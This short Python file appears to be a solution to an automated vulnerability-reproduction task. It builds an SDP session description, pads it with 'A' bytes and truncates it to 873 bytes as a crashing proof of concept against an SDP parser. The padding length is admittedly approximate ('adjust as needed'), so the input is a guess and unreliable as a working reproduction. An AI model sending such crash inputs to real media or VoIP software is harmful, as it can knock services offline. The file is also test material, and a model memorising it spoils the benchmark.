class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""v=0
o=- 3721417884 3721417884 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
m=audio 6000 RTP/AVP 0
a=rtpmap:0 PCMU/8000
a=ptime:20
""".replace(b'\n', b'\r\n') + b'A' * (873 - 200)  # Approximate to 873 bytes, adjust as needed
        return poc[:873]  # Ensure exactly 873 if needed, but aim for crashing PoC
